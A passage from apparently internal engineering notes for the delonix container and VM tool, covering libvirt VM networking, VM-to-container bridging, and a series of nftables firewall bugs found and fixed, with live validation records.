    `create` doesn't pass (CH's vmm lives inside the network holder).
- **Validated live** (host with `qemu:///session`): real VM from golden 1.34 →
  `snapshot` (checkpoint) → `snapshots` lists → `restore` → clean, no orphaned domains.
  The trait's default methods (error "not supported") are the mechanism that gives CH
  the fail-closed for free; only libvirt overrides.

### `vm start`/`vm restart` (v0.12.0) — bring a stopped VM back, without retyping the flags

Real bug report (the same `dev` from the finding above): after `vm console`
finally unstuck, the domain turned out to be really `Stopped` (reason beyond
delonix's reach — see previous section). The only way to bring it back up was
`delonix vm create dev` again, which IS idempotent/auto-heal (reuses the
overlay), but **requires the SAME flags** (`--vcpus`/`--memory`/`--disk`/etc.) —
without them, the "auto-heal" would boot with clap's defaults (1 vCPU, 1G),
silently different from the original VM. `vm start`/`vm restart`
(`delonix_vm::{start,restart}`, `crates/adapters/delonix-vm/src/lib.rs`) solve
this: they rebuild the `VmConfig` from the OWN persisted record (`config_from`) —
base disk, vcpus, memory, network, backend, `restart_policy`, `devices`, and
(libvirt only) the net mode, which `LibvirtBackend::boot` already stored in
disguise in the `Vm.tap` field (`cfg.net_mode.unwrap_or("user")`) — and delegate
to the same `create`/auto-heal as always.

**Honest limitation, documented in the `--help` itself**: the `Vm` record never
persisted everything the complete `VmConfig` has — direct-boot
kernel/initrd/firmware/cmdline, custom cloud-init seed, 9p volumes, static IP,
VNC, and the advanced libvirt fields (machine/cpu model/topology/TPM/video/
boot order/extra disks or NICs/raw XML) only ever existed as `vm create` flags
and die after it ends. A VM that needs any of these has to come back through the
original `vm create` (also idempotent) — `start`/`restart` cover the common case
(golden image, no advanced flags), they do not replace `create` for the rest.
`vm start` is idempotent (already running = no effect, delegates to `create`);
`vm restart` always forces a real reboot (stops first if running).

## libvirt VM networking — default `nat` with IP, static `--ip`, VM↔container routes

Real bug report: `vm create dev` showed `IP <none>` forever — without
`--net-mode` and rootless, the libvirt backend fell back to `qemu:///session`
user-mode (SLIRP), whose IP is invisible to `domifaddr` and unreachable. Fixed:

- **Smart default** (`LibvirtBackend::boot`): without `--net-mode`, if the SYSTEM
  connection is usable (`system_libvirt_usable`, `libvirt` group), the effective
  mode becomes **`nat`** → IP via the libvirt network's DHCP, visible and
  reachable. Only without system access does it stay user-mode, and `create`
  WARNS loudly ("no reachable IP — join the `libvirt` group…"). `Vm.tap` now
  records the **effective mode** (`nat`/`bridge`/`user`) — it is what
  `wait_for_boot` uses to distinguish "wait for the DHCP lease" from "will never
  have an IP" (before it gave up at 3s for ANY libvirt VM, even nat mid-boot).
- **`--ip <static>`** (`vm create` + `spec.ip` in the manifest): MAC→IP DHCP
  reservation on the libvirt network (`virsh net-update … ip-dhcp-host`,
  `libvirt_reserve_ip`, idempotent add-last→modify). nat mode only; clear error
  in other modes. Argv trap: the `--live --config` flags have to come BEFORE the
  `--` (after it they become positional data). **Limitation**: `vm rm` still does
  not remove the reservation.
- **Explicit `<backingStore>` in the domain XML**: the per-domain AppArmor
  profile (virt-aa-helper, Ubuntu) only whitelists paths present in the XML —
  without it QEMU opened the overlay but hit EPERM on the base qcow2
  ("Could not open …vm-images/…: Permission denied"). Format via
  `disk_backing_format` (never by extension).
- **Internal DNS**: `dns_resolve` now resolves VMs by the **record's IP**
  first (a nat/bridge VM lives on the HOST's virbr0 — the MAC never appears in
  the holder's neigh, the only previous mechanism), with neigh as fallback (CH).
  `delonix_vm::status` **persists** the newly learned IP (the DHCP lease arrives
  long after create). NOTE: DNS runs in the holder process — an old binary only
  picks this up on a holder respawn (do not force it on a host with live
  containers).
- **Reachability matrix validated live** (kaeso-sys-01, nat VM
  192.168.122.x + SDN containers 10.210.x): **container→VM works
  natively** (container → holder → slirp → host stack → virbr0; proven
  with an SSH banner received from inside kaeso-odoo) and the per-container
  EGRESS rules govern it (daddr CIDR). **VM→container**: via a published port
  bound to the VM network's gateway, or via the L7 proxy. DIRECT container IPs
  are unreachable from outside the holder's netns (slirp NAT) — joining the two
  houses (host's virbr0 ↔ SDN in the holder's netns) requires `CAP_NET_ADMIN` in
  the host's init-netns (a privileged veth+routes), outside the rootless model;
  opt-in future work (`delonixd`), NOT a toggle (`delonix0` is not a host bridge
  — confirmed). VM↔VM on the same nat network: direct over virbr0. Ingress IP
  (SDN) to a VM = Cloud Hypervisor backend (tap in the holder, SAME SDN as the
  containers → reaches them by direct IP; proven by construction, but the golden
  k8s image only boots in libvirt, not in CH).

### `delonix vm reach` — VM→container discovery (no new dataplane)

The VM→container path via **published port** only works if the bind is an
address the VM routes to — the **libvirt network's gateway** (e.g.
`192.168.122.1`), not loopback (the SAFE default, which makes VM→container fail
silently with "connection refused"). The mechanism already existed
(`DELONIX_PUBLISH_ADDR=<gw>` in `slirp_add_hostfwd`, validated IPv4); binding to
the libvirt gateway exposes it to the VMs on that network **but not to the
external LAN** (192.168.122/24 is NAT). **Proven E2E**: from inside a VM
(`ubuntu@192.168.122.50`), `curl 192.168.122.1:<port>` → HTTP 200 to a container
on the SDN; the loopback-bound one refuses, as expected.

`delonix vm reach` (`cmd/vm.rs`, `cmd_reach`) makes this discoverable: it lists
the `virbr*` gateways (`parse_ip_gateways`), reads the LIVE bind of each
published port via `ss -tlnH` (`parse_ss_binds` — the bind is NOT in the record,
it came from the env var at publish time), and separates "reachable from VMs"
(address:port) from "loopback-only" (with the exact fix command: `unpublish` +
republish with `DELONIX_PUBLISH_ADDR=<gw>`). Read-only, zero privilege, zero
change to the safe default. Pure, tested parsers (`parse_ip_gateways_pega_so_as_virbr`,
`parse_ss_binds_classifica_loopback_vs_gateway`).

### The libvirt network of a declared network: marked ownership, verified subnet (2026-10-21)

Since #866, `vm create --network <declared network>` defines a NAT libvirt network with
the same name on `qemu:///system`. Measured by the cli-tester, in an isolated root:
**nothing removed it** (`vm rm`, `network rm`, `stack destroy` left the network, the virbrN
and the host route behind), and `ensure_libvirt_network` **trusted the name** — with that
network left behind, redeclaring the network on a different subnet and creating a VM on it
gave rc 0 with the VM on the OLD subnet, and `stack plan`/`drift` silent.

- **Ownership is read from the object, never from the name.** The network the engine
  defines carries a `<metadata>` in the namespace
  `https://delonix.io/xmlns/libvirt/network/1` (libvirt stores it; measured on 10.0,
  returned with `"`). Only a network with the mark gets redefined or removed; the host
  has operator networks with names a delonix network may also have.
- **`libvirt_network_plan` (pure, table-tested):** used only on the declared subnet (or
  with nothing declared to compare against); outside it, it redefines if it is ours AND
  no domain (operator's included, stopped included) is on it; in everything else it
  refuses with **DX-5508** (class 5). An unmarked network left by an earlier binary also
  refuses — it is indistinguishable from an operator's, and the message gives the `virsh`
  to use.
- **The use case counts the users; the backend says which network each one is on.**
  `VmBackend::release_network(vm, remaining)` (default: nothing) receives, on each
  `rm`, the records of the same backend that remain — stopped included: asking libvirt
  alone would count a STOPPED VM as absent (`stop` undefines the domain). The first
  version compared `o.network == vm.network` in the use case, and the cli-tester caught
  it (BUG-1): a VM put on the network via `--bridge X` ends up with `network: ingress`,
  it didn't count, and the `rm` of the other one pulled the network out from under its
  `start`. libvirt decides with the same mapping as `boot` (`bridge` before `network`,
  `still_on_network`).
- **`start` carries the subnet declared NOW** (`VmEngine::restart_config`, via the new
  `VmNetwork::subnet_of`). One root doesn't see another's records, and `qemu:///system` is
  shared: the last `rm` of one root can pull the network a stopped VM of another root
  needs (BUG-1b). With the subnet, `start` defines it again — and judges one that ended
  up on a different subnet, like `create`. A `boot` that fails after defining the network
  takes it with it.
- Along the way: `destroy` released the static-IP reservation of `default` on a VM with
  `--network`, because `boot` maps the network to `bridge` and the record doesn't store it.
- **Gate**: the section «the libvirt network of a declared network…» in `scripts/e2e.sh`,
  inside `libvirt_system_usable`, with the «foreign» networks and domain defined by the
  section itself and never started. 17/17 with the fix; 14/17 with the version that
  counted by `network` (the three from BUG-1 and from `start`); 4/12 with the binary
  predating all of this (which also left the network behind).

## VM↔container by direct IP (`vm bridge`) — EXPERIMENTAL, privileged, opt-in

The ONE thing the rootless model can't do on its own: give a libvirt VM (on
`virbr0`, host netns) DIRECT reachability to the SDN container IPs
(`delonix0`/`dlxn…`, inside the holder netns `unshare --user --net`). Closing the
boundary requires `CAP_NET_ADMIN` in the host's init-netns, so `vm bridge`
**needs root** — it is the deliberate exception to daemonless-rootless, behind
`--apply` (default = DRY-RUN that only prints the plan). Module `cmd/vmbridge.rs`.

- **Mechanism** (`bridge_plan`, pure/tested): veth pair on the host → move the SDN
  end into the holder netns + enslave it to the network's bridge → the host end
  gets the last address before broadcast, with the network's prefix length
  (`10.210.255.254/16`; `172.20.7.254/22` on a `172.20.4.0/22` network — until
  2026-09-27 it assumed a two-octet prefix and emitted `172.20.4.0/22.255.254`) →
  `ip_forward=1` → return route `<vm-subnet> via <host-ip>` INSIDE the holder. No SNAT: the container sees the VM's real IP, and the
  per-container firewall still governs (a VM IP is not in `@dlxall`, it passes as
  a gateway; explicit `ingress` rules still apply).
- **Security**: opens VM↔container only on the indicated network; the VM subnet is
  libvirt's NAT (`192.168.122.0/24`), NOT the external LAN. `vm unbridge <network>`
  undoes it.
- **Validated input (S4, 2026-09-27)**: `--apply` refuses a non-root caller BEFORE
  any command (before, it ran the whole cleanup plan, failing on EPERM); each
  `--vm-subnet` (and each detected subnet) has to be strict `a.b.c.d/len`, neither
  `/0` nor overlapping the SDN network, and goes canonical to the argv — `default`
  reached the holder's `ip route add` as a default route.
- **`unbridge` undoes what `bridge` opened (2026-09-27)**: `bridge --apply` writes the
  canonical subnets to `<state>/ingress/vmbridge-<bridge>.subnets` BEFORE running the
  plan (a bridge that fails halfway also undoes itself), and `unbridge` deletes the
  FORWARD rules and the return route of those subnets, plus those of `--vm-subnet`, and
  removes the file at the end. With no record (an earlier bridge), it uses `--vm-subnet`
  or, failing that, the `virbr*` detection. Before, `unbridge` only detected: a bridge
  made with an explicit `--vm-subnet`, or on a host without `virbr*`, lost the veth and
  left the two ACCEPT rules and the route in the holder, with the VM↔SDN opening alive
  after the teardown. Re-`bridge` with other subnets also cleans up the recorded ones.
  Pure and tested: `teardown_subnets`, `read_applied_subnets`/`write_applied_subnets`.
- **Robustness**: `iptables -I FORWARD` ACCEPT rules in both directions
  (`<vm-subnet>↔<sdn>`) against libvirt's default REJECT; establish is
  IDEMPOTENT (cleans up an orphaned veth before creating, e.g. after a holder respawn).
- **Validated on a CIDR network (2026-09-27, S4)**: `vm bridge s4cidr --vm-subnet
  192.168.200.0/24 --apply` as root on a `172.20.4.0/22` network puts `172.20.7.254/22`
  on the host end; ping host→containers and container→host with 0% loss. The measured
  refusals: `--apply` without root, `default`, `0.0.0.0/0`, a subnet overlapping the
  SDN, and one without a length. The gap this pass measured — `unbridge` leaving the
  two `iptables FORWARD … ACCEPT` rules and the return route of a bridge made with
  `--vm-subnet` — is closed by the subnet record (bullet above).
- **VALIDATED E2E live** (kaeso-sys-01, 2026-07-21): from INSIDE a libvirt VM
  (`ubuntu@192.168.122.50`) → `ping`/`curl` to a container on `kaeso-net` by DIRECT
  IP (`10.210.37.150:8069` → HTTP 200, ttl=63 = one hop via the host's forward).
  `unbridge` cleans everything up. Three real bugs caught on the host and fixed:
  (1) under sudo it resolved root's state, not the user's (`adopt_invoking_user_root`
  via `$SUDO_USER`); (2) `nsenter -U -n` dropped the caps → EPERM on the enslave, it has
  to be `-n` alone (root keeps the init-userns `CAP_NET_ADMIN` over the netns of the
  descendant userns); (3) container IPs are dynamic (DHCP, change on restart).
- **Follow-ups**: persistence (re-apply on a holder respawn) and **discovery
  by NAME** (the VM resolving `<c>.<ns>.delonix.internal` via the holder's DNS, so
  as not to depend on dynamic IPs) — the slice that gives the real value. Complements
  `vm reach` (via published port, no privilege) for whoever needs the raw 10.x IP.

## Firewall `ingress`/`egress` — last command wins (+ surgical `rm`)

Real bug report: `ingress deny <c> 8069` followed by `ingress allow <c> 8069`
left the service blocked FOREVER — the rules accumulated in `ContainerFw`
and the nft chain is first-match terminal, so the old deny (above) won. Fixed
in `cmd/firewall.rs::add_rule` (ufw semantics): a new rule for the SAME
match (dir/proto/port/source, with `""`≡`0.0.0.0/0`≡`*` via `norm_any`)
**replaces** the existing one, with a note in the output. For partial overlaps (e.g.
`deny any/8069` vs `allow tcp/8069`, distinct matches) a **shadow warning**
(`field_overlaps`) explains that the earlier rule still matches first and gives
the command to remove it. New **`ingress|egress rm <c> <[proto/]port> [--from/
--to]`** — surgical removal where the spec's wildcards are a FILTER (`rm c 8069`
removes tcp/udp/any on that port); it complements `clear` (all-or-nothing) and follows
its "an empty firewall disappears entirely" rule. Also fixed:
`ingress unpublish` on a STOPPED container with no custom network — the hostfwd lives in
the per-container slirp, which died with it; only the record is cleaned up (before: error
"container is not running" and the publish stayed stuck). Validated E2E live
(deny→000, allow→200 with replacement, rm→clean). Note: an empty `ingress -h`
reported once did NOT reproduce (3× OK) — terminal glitch, no cause in the CLI.

### Review of the `-p` ↔ `ingress`/`egress` flow (2026-07-27) — 1 SECURITY bug + 3 consistency ones

Real user bug report: "the browser shouldn't block when the container is exposed via `-p`".
The investigation started from the symptom and ended somewhere else — the symptom was real, but the serious finding was next to it. The four problems share the same conceptual root: **`-p` (publish) and
`ingress`/`egress` (firewall) are two independent planes that nobody reconciled**, neither in the
dataplane nor in what the CLI told the user.

1. **CRITICAL (security) — the PORT was silently ignored when the proto was `any`.**
   `fw_chain_body` (`delonix-sdn/src/infra.rs`) only emitted the `dport` INSIDE the
   `proto != "any"` branch. Since `parse_port_spec` makes `proto` fall to `any` whenever the user
   writes a bare port (`allow <c> 9999`, the overwhelmingly common form), the generated rule was
   `ip daddr <ip> accept` — **the whole container**, not the requested port. Consequence measured
   live, not theoretical: with `policy deny`, an `ingress allow <c> 9999` (a completely unrelated
   port) OPENED the published port 18099; with `policy allow`, an `ingress deny <c> 9999` CLOSED it. The
   command did the opposite of what it said, exactly where being wrong is a security hole.
   With an explicit proto (`tcp/9999`) it always worked — that is why it never showed up in the
   earlier E2E tests, which use the form with a proto. **Fixed**: `any` + port now emits
   `meta l4proto { tcp, udp } th dport <port>` (`th` = transport header, valid for both,
   `n-m` ranges included — `fw_port_ok` already validates them). Regression in
   `fw_body_keeps_the_port_when_proto_is_any`. **Proven by unit test, NOT live**:
   `fw_chain_body` runs inside the HOLDER process, and this host has live containers (odoo,
   registries, k8s control-planes) — respawning the holder would tear down everyone's SDN (same
   note already recorded for the internal DNS). It only picks up the fix on a holder respawn.
2. **`ingress ls` lied about the published ports.** The table always printed
   `publish <spec> 0.0.0.0/0 allow DNAT`, unconditionally. Reproduced live: with
   `policy deny`, `curl` gave `000` and the table kept saying `allow` — in the column read precisely
   to decide whether something is exposed. **Fixed** with `published_verdict`, which
   resolves the verdict the way the dataplane resolves it, and prints `BLOCKED` + the exact
   recovery command. `set_policy` gained the same warning at the moment the `deny` is applied.
3. **The port a rule has to name is the CONTAINER's, never the host's** — the DNAT runs in
   `prerouting`, so by the time the packet reaches the per-container chain the `dport` is already the `cp` of
   `hp:cp`. It wasn't documented anywhere and it is counter-intuitive (`ls` shows `18099:80`,
   the rule has to say `80`). Before fix #1 this didn't even show: with `proto: any` the rule
   ignored the port and "worked" by accident, for the wrong reason. Now the warning messages
   say so explicitly.
4. **`net ingress ls` listed containers the firewall probably doesn't govern.** A
   `--net host`/`none` appeared with `allow (default)`, which reads as "governed and open",
   when `require_sdn_ip` refuses ANY firewall mutation for it (`ingress allow
   mandume-benguela-02 80` → error). It became `n/a (host net)`.

**The original symptom (the browser) was the safe-by-default behavior, with no CLI surface.**
`slirp_add_hostfwd` always binds to `127.0.0.1` — correct by default, but the ONLY way to
widen it was the undocumented env var `DELONIX_PUBLISH_ADDR`, and `parse_publish` REJECTED the
Docker syntax `-p <ip>:<hp>:<cp>` as "invalid port". A browser on another machine (or the host
itself via its LAN IP) got connection-refused with nothing to explain why. **Fixed**:
`parse_publish_addr` reads the form `[hostIp:]hostPort:contPort[/proto]` and `publish_bind_addr`
concentrates the precedence (spec > env > `127.0.0.1`) in one place, so the TWO publish paths
(per-container slirp and the ingress single slirp) don't diverge. The safe default stays intact —
widening is always an explicit opt-in. IPv4 only (it is interpolated into the slirp api-socket JSON; an
IPv6 literal would also collide with the split on `:`); a non-IPv4 head is **refused**, never
dropped silently — which was exactly the bug of the compose with `127.0.0.1:9000:80`.
**Validated live**: `-p 0.0.0.0:18099:80` → `ss` confirms a bind on `0.0.0.0`, and
`curl http://192.168.1.106:18099/` → **200** (before: spec refused; with `8080:80`, `000` on the LAN).

**Debt recorded here and CLOSED on 2026-07-28** (see "Hardening of ingress/egress" below):
`infra::publish_port_allow` (publish with a CIDR allowlist BEFORE the DNAT) had **zero
callers** — the same family of trap as `mount_live`/`set_net_rate`/`update_limits`. It was
**deleted**, not wired up: published traffic all arrives with the slirp gateway as its source, so
the allowlist wouldn't match anything and the `!= { … } drop` would have dropped EVERYTHING.

### `-p 80:80` answered with slirp's raw JSON (2026-07-27)

Real bug report: `container run --rm -p 80:80 nginx` →
``system call `slirp hostfwd` failed: port 80: {"error":{"desc":"bad request: add_hostfwd:
slirp_add_hostfwd failed"}}``. **Not a dataplane bug** — slirp's `add_hostfwd` does the bind on the
HOST side, as this same unprivileged user, and a port below
`net.ipv4.ip_unprivileged_port_start` (1024) needs `CAP_NET_BIND_SERVICE`. The limitation was
already documented (it is the reason the L7 proxy's auto-routes serve on `:8080`), but the user
got opaque JSON **after** the container was already created.

- **Preflight in `cmd_run`**, next to the port-in-use error and in the same format (the fact first,
  then the ready-to-copy commands: `-p 8080:80`, or `sysctl -w ip_unprivileged_port_start=80`).
  It fails before creating anything.
- **`delonix_sdn::can_bind_host_port`** decides by a **real bind**, not by comparison with the
  sysctl: the sysctl isn't the whole rule (a binary with `CAP_NET_BIND_SERVICE` binds to 80 with it
  untouched). `EADDRINUSE` does **not** count as a failure — a busy port is a different diagnosis, with its
  own error that names the owner, and this check must not steal it (covered by a test).
- `slirp_add_hostfwd` now appends the same explanation to the message when the port is
  privileged — the paths that do no preflight (ingress, compose, `container update
  --publish-add`, the docker API) all land there.

Validated live in EN and PT. Test note: a failed `run` with `--rm` left an orphaned `slirp4netns`
holding the port (the known case of `reap_orphan_slirp`, reaped on the next `run`) —
cleaned by hand in this session.

**Where the user lowers the threshold (decision closed, 2026-07-28).** `install.sh --low-ports`
(commit `ec8f079`) already wrote `/etc/sysctl.d/99-delonix-lowports.conf` — what was missing was
being DISCOVERABLE: it wasn't in `README.rst` (only in the v0.36.1 notes) and the error above sent you to a
one-off `sysctl -w`, which doesn't survive a reboot. Fixed in both places (the error now points to
the installer with the flag). **The public default stays opt-in** — lowering the boundary on a
shared/production host lets any local program bind to 80-1023, and the alternative that lowers
nothing is a root proxy on 80 forwarding to a high port.

**The rootless golden VM (`--no-k8s`) is the exception and ships with the sysctl ALREADY applied**
(`rootless_customization_steps`): it is a disposable, single-tenant VM whose entire purpose
is to run Delonix rootless — the host-wide compromise has no meaning there. **The k8s golden does NOT
carry it** (that node's kubelet/kube-proxy already run as root); that is why the step lives in
`rootless_customization_steps` and not in `shared_account_steps`. Written as a FILE in
`/etc/sysctl.d`, never `sysctl -w`: `virt-customize` runs against an offline guest, only what
lands on disk reaches the first boot. Test:
`so_a_golden_rootless_traz_as_portas_baixas_abertas` (the 3 distros carry it, the k8s golden doesn't).

### Sweep #2 of the communication flow (2026-07-27) — the primary IP as a blind spot

A direct continuation of the review above, at the user's request ("is there any more communication bug?").
Four new findings, all **reproduced live**. Three share ONE root: **the whole control plane
assumes a container has ONE IP**. Multi-homing (`--net-connect`) gives it a second, and
that second is invisible to everything that should govern it.

1. **HIGH (security) — the per-container firewall does not govern the additional networks.**
   `apply_firewall(id, ip, fw)` received only `c.ip` and the jumps in `fwdeny` are
   `ip daddr <ip> jump fw<hash>` — the extra IP has no jump, so it never enters the chain.
   **Live**: `ingress policy deny` on B → A→B via the primary IP `blocked`; with both connected to a
   2nd network, A→B via the extra IP **REACHABLE**. `ingress`/`egress`/`Dependency` are all
   bypassable via multi-homing. **Fixed** with `apply_firewall_all` (control line
   `firewall <id> <ip1,ip2,…> <hex>`) + `do_firewall` emitting one body per IP and a pair of jumps
   per IP. With a single IP the line stays byte-for-byte equal to the old one — an earlier holder keeps
   serving the single-homed case, only the multi-IP form requires the new one.
2. **HIGH (security) — namespace isolation is also bypassable via multi-homing.**
   `do_attach_extra` never called `ns_set_join`, unlike `do_attach`: the extra IP stays
   out of `@dlxall`/`@dlxns_<ns>`, and the cross-namespace cutoff rule
   (`ip saddr @dlxall ct state new drop`) only fires for sources in `@dlxall`. **Live**:
   teamA↔teamB `blocked` via the primary IPs, **REACHABLE** via the extra ones. **Fixed**: the
   `attach-extra` line gained the namespace token (6 tokens = `default`, 7 = namespaced — the same
   compatibility pattern `attach` already used) and calls `ns_set_join`.
   **Corollary fixed along the way**: the `fwdeny` jumps are now **rebuilt** (not
   added-if-missing). A container that LEAVES an additional network left the jump of the freed IP
   there, and the IPAM hands that IP to another container later — the next tenant
   silently inherited this one's firewall. `--net-connect`/`--net-disconnect` now reapply the
   firewall.
3. **MEDIUM — the additional networks disappeared on a `stop`+`start`, silently.** `cmd_start`
   reattaches only the primary network; `c.extra_networks` is persisted but was never reproduced.
   **Live**: `eth1` present before, absent after, and `describe` kept listing
   `Extra: dlx-dev2 (10.239.x on eth1)`. A service reachable only via that 2nd network broke on the
   first restart, with no warning line. It is the SAME family as the `-v` that wasn't persisted
   (see `cluster load`, above) — but unlike that one, here the state WAS stored: what was missing
   was something to replay it. **Fixed**: `cmd_start` reattaches each `ExtraNet` (same `id` in the IPAM, so
   the IP comes back the same; if it comes back different, the record is corrected instead of pointing
   to an address that no longer exists). **Validated live**: `eth1` with the SAME IP after the
   restart.
4. **MEDIUM — `unpublish` was protocol-blind, `publish` was not.** `-p 53:53/tcp` and
   `-p 53:53/udp` coexist as two distinct publications, but `slirp_remove_hostfwd` matched only
   by `host_port` and `do_unpublish` used the needle `dport <n> ` — both tore down EVERYTHING. Worse,
   `unpublish_live` removed ONE entry from the record. **Live**: `--publish-rm 18100` left the
   record saying `18100:53/tcp` with **zero** bindings in `ss` and `curl` giving `000` — the record
   lying about the dataplane, and the port staying reserved in `port_owner` for a container that no
   longer serves it. **Fixed**: `slirp_remove_hostfwd_proto`/`do_unpublish(port, proto)`/
   `unpublish_port_proto` and `unpublish_live` removing ALL entries for that host port.
   **Validated live**: record and `ss` both go empty. (The 2-token form stays identical
   for the teardown, for compatibility with an earlier holder.)

**The cross-cutting lesson, worth more than the four bugs**: `c.ip` is not "the container's
address" — it is "the address on the primary network". Whenever a network function receives a single IP
from the record, ask what happens with a non-empty `extra_networks`. It is the same class as the
already-documented trap of `container.userns` ("it is not 'it is in a different userns from mine'") and of
`status()` by pidfile ("it is not 'the holder is reachable'").

**Validation note, important for whoever continues**: findings 1, 2 and half of 4 fix
code that runs INSIDE the holder (`do_firewall`/`do_attach_extra`/`do_unpublish`). This host has
live containers (odoo, registries, k8s control-planes) and respawning the holder would tear down
everyone's SDN — so **the bugs were proven live, but the fixes for those three are proven
by unit test and reading, not live**. They only take effect on a holder respawn. Findings 3 and
the CLI side of 4 run in the CLI process and are validated live end to end.

### Hardening of ingress/egress (2026-07-28) — `policy deny` was broken in both directions

Request: bring ingress/egress to Docker/Podman maturity. The review started as an
assessment and ended in fixes, because the first finding invalidated the whole subsystem.
**All findings were reproduced live first, and all fixes validated live
afterward** (the holder was DOWN with refcount 0 and no networks — it was possible to respawn it with the new
binary without tearing anything down, unlike the earlier sessions).

1. **CRITICAL — `policy deny` killed legitimate traffic, in both directions.** `ingress policy deny`
   took away the OWN container's outbound (DNS included); `egress policy deny` left a published
   service without a response (`curl` 200 → 000). Single cause: the default policy emitted a
   `ip daddr <ip> drop`/`ip saddr <ip> drop` **without `ct state`**, in a chain hung at
   `forward priority -10` — BEFORE the `ct state established,related accept` of `forward`
   (priority 0). The return traffic never got to see the accept. Namespace isolation, next to it,
   already did the right thing (`ct state new drop`) — only the policy was left out. Consequence:
   "default-deny + explicit allow", the subsystem's reason for existing, was inexpressible.
   **Fixed** with `fw_chain_prologue` (emitted ONCE per chain, not per IP — the state is the
   flow's, not the address's): `ct state invalid drop` + `ct state established,related accept`.
   **Side effect to know**: an explicit `deny` no longer tears down an ALREADY established flow, it only
   prevents new ones — it is what k8s's iptables/nft/NetworkPolicy do, and it is what
   `conntrack` (already an installer dependency) exists for. Validated live: with `ingress policy
   deny` outbound works AND a new inbound connection stays blocked; with `egress policy
   deny` the published one responds AND outbound stays blocked.
2. **The firewall application wasn't atomic.** `do_firewall` was a sequence of separate
   `nft` invocations (add chain → list → N× delete rule → 2×IPs add rule → and only then the
   flush+body). Each one is a kernel transaction, so **between deleting the old jumps and
   putting in the new ones the container had no firewall at all** — a window opened by any
   `ingress deny`/`--net-connect`. It became **a single `nft -f` script**: the kernel applies it
   atomically and a syntax error leaves the previous ruleset intact instead of half-applied.
3. **Linear dispatch → verdict map.** `fwdeny` carried **2 jump rules per IP per container**;
   with the 49 containers this host has already had, each packet traversed ~100 rules before reaching
   its own. Now there is a `map fwmap { type ipv4_addr : verdict }` and its own chain **`fwcont`**
   (priority -5) with exactly 2 rules (`ip daddr vmap @fwmap` / `ip saddr vmap @fwmap`),
   regardless of the number of containers. **The dedicated chain isn't cosmetic**: putting the
   dispatch rules in `fwdeny` would leave their order relative to the per-network egress rules depending on the
   ORDER OF EVENTS (which command ran first), not on intent. Separated, the network's egress policy
   runs first and stays authoritative, and the per-container rules apply
   within it (an `accept` isn't terminal between base chains, so a network accept never
   bypasses the container firewall). Confirmed live in `nft list chain ip dlxing fwcont`.
4. **`counter` on ALL rules + PACKETS/BYTES columns in `ls`.** There was no way to answer
   "has this rule ever matched?" — half of what a firewall is for. `fw_rule_tail`
   (new) is shared by the GENERATOR and the READER: the tail is identical across all addresses of a
   multi-homed container, which is exactly what allows summing a rule's counters across
   the networks. If the two had their own copies of the formatting, the reader would stop matching
   silently the day the generator changed a space. Validated live (real `2 packets / 88 B`).
5. **IPv6 was a trap, now it is a clear refusal.** `fw_src_ok` accepted v6 CIDR but the dataplane is
   `table ip` (v4): the user got a raw nft dump from the depths of the holder. Validator
   tightened to IPv4 + `check_cidr` (one place for all entry points) naming IPv6
   explicitly. Serious v6 support is an `inet` table + v6 SDN — its own work, not a
   validator relaxation.
6. **Port ranges** (`-p 8000-8002:9000-9002`, Docker syntax) via `expand_publish_range`, which
   expands **at the boundary** — everything downstream (port ownership, `unpublish`, the record's
   `ports`) stays per-single-port, and that is how it should stay. Different widths are **refused**
   with the count on both sides, never silently truncated. Wired into `run` AND into
   `update --publish-add` (a flag that works in one place and not the other is worse than none).
   Also caught: port `0` and `70000` passed the "digits only" test.
7. **`publish_port_allow`/`do_publish_allow`/`publish-allow` REMOVED.** Zero callers since
   forever — and they couldn't work: all traffic arriving via a published port carries the
   **slirp gateway** as its source, so an allowlist of real CIDRs wouldn't match anything and the
   `!= { … } drop` before the DNAT would have dropped EVERYTHING. It was the trap this code base had
   already walked into three times (`mount_live`, `set_net_rate`, `update_limits`): public, dead,
   mutating shared state, with the latent bug waiting for the first caller.

**`delonix_sdn::SLIRP_GW` (`10.0.2.2`) — and the correction of a too-broad conclusion.** The first
measurement of this session (client on `127.0.0.1`) saw `10.0.2.2` in the nginx log and from that
concluded that the source IP NEVER survives the hostfwd. **Wrong, and corrected the same day with three clients instead
of one**: `127.0.0.1` → `10.0.2.2`, but `172.16.31.103` (LAN) and `192.168.122.1` (libvirt
gateway) reach the container **as themselves**. libslirp cannot use a loopback address
as a source inside the emulated network — there is no route back — so it replaces it with the
gateway; every routable source passes intact. **Method lesson**: a single test client does not
characterize a network path, and the handiest client (`localhost`) is precisely the special case.

Consequences, all confirmed live: **source filtering WORKS on published ports**
(`policy deny` + `allow <port> --from <cidr>` → allowed source 200, another source 000), and
`do_l4guard`'s per-source rate-limit separates real clients. The only exception is the loopback
client, which doesn't match a rule written for a real address — what matters to know is that testing
such a rule with `curl localhost` fails for a reason that has nothing to do with the rule.

Three things turned out wrong with the correct model and were fixed: (1) `ingress ls` showed
`-` in the counters of a `--from <ip>/32` rule with real traffic — the kernel renders a single-host
prefix as a bare address, so the generated `/32` never matched the listing; `fw_rule_tail`
now omits it; (2) `published_verdict` (boolean) said **BLOCKED** to a publish restricted to a
source, with a warning asserting "the port answers nothing" — false precisely in the most
useful configuration there is (exposing a port to a single network); it became `published_reach` with three
states (`Open`/`Sources`/`Blocked`); (3) the publish FROM column, which this session had just changed
to `10.0.2.2`, now shows the real authorized sources, with the loopback caveat in the note.

And **`publish_port_allow` stays removed, but for a different reason**: it is not impossible, it is
**redundant** — the per-container chain already does source filtering and does it well. Two parallel
mechanisms for the same job, in different chains with different precedences, is how two
answers to the same question start to diverge.

**Also still open** (not touched in this session): `l4guard` is only reachable via a manifest
(no CLI command) and is global-only; rules with no explicit ordering/priority; no per-rule
`log prefix`. (Pods and VMs entered isolation in v0.40.0 and post-respawn recovery covers pods
since v0.41.0 — see the «Namespace isolation» section.)

### A published port's bind address is now RECORDED (2026-10-07)

The address a published port binds with was state **used** at publish time and never
**persisted**: the record stored the spec as it was written (`51072:80`) and
`publish_bind_addr` resolved `DELONIX_PUBLISH_ADDR` again on each `start`. Fifth
occurrence of the already-catalogued trap — *state needed to REBUILD the resource has
to be persisted, not just used at creation* (`-v`, `-p` on a custom network, extra
networks, `Container.pod`).

**Measured in both directions**, with an isolated root, against the bind read from the kernel and not against
what the command said:

- `DELONIX_PUBLISH_ADDR=0.0.0.0 … publish 51072:80` bound to `0.0.0.0`, recorded `51072:80`,
  and the next `container start` — the one a `net boot enable` unit runs, with no environment
  at all — brought it back on `127.0.0.1`. Service down, listing saying published.
- The INVERSE, which is what weighs on security: a port published on purpose **without** an
